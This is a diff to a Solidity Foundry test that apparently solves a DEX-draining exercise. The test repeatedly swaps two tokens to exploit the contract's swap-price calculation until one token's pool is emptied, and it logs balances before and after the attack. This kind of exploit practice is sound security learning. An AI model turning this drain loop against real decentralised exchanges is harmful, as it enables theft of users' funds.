@@ -29,8 +29,8 @@ contract DexTest is Test {
         vm.label(attacker, "Attacker");
     }
 
-    function test_swapToken() public {
-        console.log("\n===============BEFORE ATTACK======================\n");
+    function test_drainDexTokenA() public {
+        console.log("\n===============BEFORE ATTACK OF DEX 1======================\n");
         uint256 initialDexBalA = swappabletokenA.balanceOf(address(dex));
         uint256 initialDexBalB = swappabletokenB.balanceOf(address(dex));
         uint256 initialAttackerBalA = swappabletokenA.balanceOf(attacker);
@@ -50,18 +50,8 @@ contract DexTest is Test {
             swappabletokenA.balanceOf(address(dex))
                 > dex.getSwapPrice(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker))
         ) {
-            if (swappabletokenB.balanceOf(attacker) == 0) {
-                break;
-            }
             dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(attacker));
-            if (
-                swappabletokenB.balanceOf(address(dex))
-                    > dex.getSwapPrice(
-                        address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker)
-                    )
-            ) {
-                dex.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
-            }
+            dex.swap(address(swappabletokenA), address(swappabletokenB), swappabletokenA.balanceOf(attacker));
         }
 
         dex.swap(address(swappabletokenB), address(swappabletokenA), swappabletokenB.balanceOf(address(dex)));
@@ -73,7 +63,7 @@ contract DexTest is Test {
         console.log("After Swap Dex Token B Bal ", AfterSwapDexBalB);
         console.log("After Swap Attacker Token A Bal ", swappabletokenA.balanceOf(attacker));
         console.log("After Swap Attacker Token B Bal ", swappabletokenB.balanceOf(attacker));
-        console.log("\n===============END OF ATTACK======================");
+        console.log("\n===============END OF DEX 1 ATTACK======================");
 
         vm.stopPrank();
 
